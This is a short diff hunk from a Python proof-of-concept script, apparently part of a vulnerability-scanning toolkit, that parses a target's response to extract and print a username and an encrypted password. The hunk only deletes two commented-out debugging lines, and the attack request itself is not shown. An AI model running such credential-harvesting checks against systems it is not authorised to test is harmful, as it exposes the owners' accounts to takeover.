@@ -19,8 +19,6 @@ def poc():
 		result = re.search(p,resp.text).group(0).split('<br>')
 		print("[*] Get the username : "+ result[0])
 		print("[*] Get the password(encrypted) : "+ result[1])
-		# r = requests.get(url,proxies=proxy)
-		# print(r.text)
 		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
 	except (KeyError,AttributeError) as e:
 		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
